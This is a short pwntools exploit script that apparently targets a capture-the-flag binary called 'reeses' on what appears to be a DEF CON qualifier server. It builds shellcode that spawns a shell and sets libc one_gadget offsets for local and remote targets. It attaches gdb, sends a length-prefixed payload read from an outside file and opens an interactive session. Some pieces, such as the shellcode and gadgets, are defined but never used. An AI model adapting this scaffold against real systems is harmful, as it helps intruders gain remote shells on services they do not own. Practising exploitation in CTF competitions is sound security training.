from pwn import *
import time, sys

def getfile(filename):
	fd = open(filename, "r")
	contents = fd.read()
	fd.close()
	return contents

useremote = "remote" in sys.argv
filename = "./reeses"
if useremote:
	p = remote("reeses_fc849330ede1f497195bad5213deaebc.quals.shallweplayaga.me", 3456)
else:
	p = process(filename)

context.binary = ELF(filename)
context.log_level = 'debug'

shellcode = asm(shellcraft.sh())

if not useremote:
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
	libc.symbols['one_gadget'] = 0x4526a
else:
	libc = ELF('libc.so')
	libc.symbols['one_gadget'] = 0x4652c




if not useremote and not "nogdb" in sys.argv:
	gdb.attach(p, '''
	set disassembly-flavor intel
	set height 0
	c
	''')

mipsfile = "sample1_copy"

contents = getfile(mipsfile)
p.write(p32(len(contents)))
p.write(contents)

p.interactive()
